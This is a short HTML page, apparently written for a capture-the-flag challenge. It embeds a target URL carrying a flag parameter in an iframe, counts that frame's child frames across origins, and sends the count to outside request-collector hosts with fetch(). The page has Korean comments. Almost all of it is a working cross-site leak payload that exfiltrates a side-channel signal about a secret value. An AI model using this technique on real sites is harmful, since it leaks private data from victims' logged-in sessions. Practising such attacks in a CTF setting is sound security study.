<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iframe Example</title>
</head>
<body>
    <h1>Main Frame233333</h1>
    <iframe id="main_frame" src="http://war.sschall.xyz:60001/flag?flag=s" width="100%" height="600px"></iframe>

    <script>
        const iframe = document.getElementById('main_frame');

        fetch(`https://cjetgeg.request.dreamhack.games?iframeCount=hi`);

        iframe.onload = async () => {
            let childIframesCount;

            try {
                childIframesCount = iframe.contentWindow.frames.length; // 자식 iframe 개수 가져오기
            } catch (e) {
                console.error('Error accessing child iframes:', e);
                childIframesCount = -1; // 오류 발생 시 -1로 설정
            }

            // 자식 iframe 개수를 서버로 전송
            fetch(`https://olohpnk.request.dreamhack.games?iframeCount=${childIframesCount}`);
        };
    </script>
</body>
</html>
